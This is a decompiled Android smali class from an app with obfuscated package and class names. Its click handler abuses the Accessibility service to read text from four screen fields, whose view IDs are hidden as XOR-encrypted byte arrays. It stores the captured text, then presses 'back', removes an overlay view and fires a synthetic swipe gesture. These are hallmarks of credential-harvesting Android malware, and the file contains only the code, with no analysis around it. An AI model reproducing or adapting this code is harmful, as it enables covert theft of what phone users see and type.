.class Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT;->i(Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic b:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 7

    sget-object p1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p1}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->d(Ljava/lang/Boolean;)V

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    check-cast p1, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {p1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    const/16 v0, 0x26

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result v0

    const/4 v2, 0x0

    const/4 v3, 0x1

    if-ne v0, v3, :cond_0

    invoke-interface {p1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT;->b(Ljava/lang/String;)Ljava/lang/String;

    :cond_0
    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    check-cast p1, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {p1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    const/16 v0, 0x28

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v4, v1, [B

    fill-array-data v4, :array_3

    invoke-static {v0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result v0

    if-ne v0, v3, :cond_1

    invoke-interface {p1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT;->d(Ljava/lang/String;)Ljava/lang/String;

    :cond_1
    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    check-cast p1, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {p1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    const/16 v0, 0x29

    new-array v0, v0, [B

    fill-array-data v0, :array_4

    new-array v4, v1, [B

    fill-array-data v4, :array_5

    invoke-static {v0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result v0

    if-ne v0, v3, :cond_2

    invoke-interface {p1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT;->f(Ljava/lang/String;)Ljava/lang/String;

    :cond_2
    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    check-cast p1, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {p1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    const/16 v0, 0x2b

    new-array v0, v0, [B

    fill-array-data v0, :array_6

    new-array v1, v1, [B

    fill-array-data v1, :array_7

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result v0

    if-ne v0, v3, :cond_3

    invoke-interface {p1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT;->g(Ljava/lang/String;)Ljava/lang/String;

    :cond_3
    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    check-cast p1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {p1, v3}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    sget-object p1, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT;->f:Landroid/widget/FrameLayout;

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT;->a:Landroid/widget/TextView;

    invoke-virtual {p1, v0}, Landroid/view/ViewGroup;->removeView(Landroid/view/View;)V

    const-wide/16 v0, 0xbb8

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x1a

    if-lt p1, v0, :cond_4

    new-instance v1, Landroid/graphics/Path;

    invoke-direct {v1}, Landroid/graphics/Path;-><init>()V

    sget-object p1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j70;->c(Landroid/content/Context;)I

    move-result p1

    div-int/lit8 p1, p1, 0x2

    int-to-float p1, p1

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j70;->b(Landroid/content/Context;)I

    move-result v0

    int-to-float v0, v0

    const/high16 v2, 0x40800000    # 4.0f

    div-float v2, v0, v2

    invoke-virtual {v1, p1, v2}, Landroid/graphics/Path;->moveTo(FF)V

    const v2, 0x3f4ccccd    # 0.8f

    mul-float/2addr v0, v2

    invoke-virtual {v1, p1, v0}, Landroid/graphics/Path;->lineTo(FF)V

    new-instance p1, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {p1}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    const-wide/16 v2, 0x1

    const-wide/16 v4, 0x5dc

    const/4 v6, 0x0

    invoke-static/range {v1 .. v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cm;->a(Landroid/graphics/Path;JJZ)Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {p1}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object p1

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;

    invoke-direct {v1, p0}, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;-><init>(Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;)V

    invoke-static {v0, p1, v1}, Lcom/vknnolqo/p9sv5zvf/TEh82iEU;->f(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Landroid/accessibilityservice/GestureDescription;Lcom/vknnolqo/p9sv5zvf/TEh82iEU$c;)V

    :cond_4
    return-void

    :catch_0
    move-exception p1

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, p1}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :array_0
    .array-data 1
        -0x5t
        0x1t
        -0x21t
        -0x64t
        -0xet
        0x4dt
        0x54t
        -0x7at
        -0xft
        0x5et
        -0x64t
        -0x2ft
        -0x5t
        0x2t
        0x47t
        -0x7et
        -0x14t
        0xbt
        -0x25t
        -0x7et
        -0x51t
        0x45t
        0x44t
        -0x34t
        -0x15t
        0x3t
        -0x3ft
        -0x13t
        -0xat
        0x43t
        0x44t
        -0x7at
        -0x39t
        0x7t
        -0x24t
        -0x3et
        -0x20t
        0x58t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x68t
        0x6et
        -0x4et
        -0x4et
        -0x6bt
        0x2ct
        0x20t
        -0x1dt
    .end array-data

    :array_2
    .array-data 1
        0x3at
        0x45t
        -0x80t
        0x68t
        -0x1et
        -0x2t
        -0x69t
        0x5ct
        0x30t
        0x1at
        -0x3dt
        0x25t
        -0x15t
        -0x4ft
        -0x7ct
        0x58t
        0x2dt
        0x4ft
        -0x7ct
        0x76t
        -0x41t
        -0xat
        -0x79t
        0x16t
        0x3ct
        0x47t
        -0x74t
        0x2ft
        -0x17t
        -0x40t
        -0x80t
        0x56t
        0x3dt
        0x4ft
        -0x4et
        0x2ft
        -0x15t
        -0x11t
        -0x6at
        0x4dt
    .end array-data

    :array_3
    .array-data 1
        0x59t
        0x2at
        -0x13t
        0x46t
        -0x7bt
        -0x61t
        -0x1dt
        0x39t
    .end array-data

    :array_4
    .array-data 1
        -0x4bt
        -0x4at
        -0x77t
        -0x51t
        -0x2et
        -0x1ft
        -0x75t
        -0x41t
        -0x41t
        -0x17t
        -0x36t
        -0x1et
        -0x25t
        -0x52t
        -0x68t
        -0x45t
        -0x5et
        -0x44t
        -0x73t
        -0x4ft
        -0x71t
        -0x17t
        -0x65t
        -0xbt
        -0x4ft
        -0x4at
        -0x75t
        -0x1at
        -0x27t
        -0x1bt
        -0x60t
        -0x47t
        -0x47t
        -0x43t
        -0x7ft
        -0x22t
        -0x24t
        -0x12t
        -0x71t
        -0x51t
        -0x5et
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x2at
        -0x27t
        -0x1ct
        -0x7ft
        -0x4bt
        -0x80t
        -0x1t
        -0x26t
    .end array-data

    :array_6
    .array-data 1
        0x37t
        0x3ct
        -0x3ct
        -0x66t
        0x58t
        -0x30t
        0x70t
        -0x7at
        0x3dt
        0x63t
        -0x79t
        -0x29t
        0x51t
        -0x61t
        0x63t
        -0x7et
        0x20t
        0x36t
        -0x40t
        -0x7ct
        0x5t
        -0x28t
        0x60t
        -0x34t
        0x32t
        0x26t
        -0x39t
        -0x30t
        0x60t
        -0x3ft
        0x65t
        -0x70t
        0x27t
        0x24t
        -0x3at
        -0x3at
        0x5bt
        -0x12t
        0x6dt
        -0x73t
        0x24t
        0x26t
        -0x23t
    .end array-data

    :array_7
    .array-data 1
        0x54t
        0x53t
        -0x57t
        -0x4ct
        0x3ft
        -0x4ft
        0x4t
        -0x1dt
    .end array-data
.end method
